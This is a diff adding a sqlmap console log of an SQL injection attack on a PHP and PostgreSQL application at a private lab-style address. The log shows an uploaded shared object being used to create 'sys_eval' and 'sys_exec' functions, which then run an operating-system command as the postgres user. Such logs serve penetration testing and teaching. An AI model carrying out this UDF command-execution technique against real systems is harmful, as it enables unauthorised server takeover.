@@ -1,0 +1,30 @@
+---
+[09:23:44] [INFO] testing PostgreSQL
+[09:23:44] [INFO] confirming PostgreSQL
+[09:23:44] [INFO] the back-end DBMS is PostgreSQL
+web application technology: Apache, PHP 5.4.36
+back-end DBMS: PostgreSQL
+[09:23:44] [INFO] testing if current user is DBA
+[09:23:44] [INFO] detecting back-end DBMS version from its banner
+what is the back-end database management system architecture?
+[1] 32-bit (default)
+[2] 64-bit
+> 2
+[09:23:47] [INFO] checking if UDF 'sys_eval' already exist
+[09:23:47] [INFO] checking if UDF 'sys_exec' already exist
+UDF 'sys_exec' already exists, do you want to overwrite it? [y/N] y
+[09:23:49] [WARNING] time-based comparison requires larger statistical model, please wait............................ (done)                
+[09:23:49] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+[09:23:50] [INFO] the local file '/tmp/sqlmapeOrWpa12055/lib_postgresqludf_sys6PjOyJ.so' and the remote file '/tmp/libsubmb.so' have the same size (6152 B)
+[09:23:50] [INFO] creating UDF 'sys_eval' from the binary UDF file
+[09:23:50] [INFO] creating UDF 'sys_exec' from the binary UDF file
+do you want to retrieve the command standard output? [Y/n/a] y
+command standard output:    'uid=1001(postgres) gid=1001(postgres) groups=1001(postgres)'
+[09:23:51] [INFO] cleaning up the database management system
+do you want to remove UDF 'sys_eval'? [Y/n] 
+do you want to remove UDF 'sys_exec'? [Y/n] 
+[09:23:54] [INFO] database management system cleanup finished
+[09:23:54] [WARNING] remember that UDF shared object files saved on the file system can only be deleted manually
+[09:23:54] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.26.169'
+
+[*] shutting down at 09:23:54
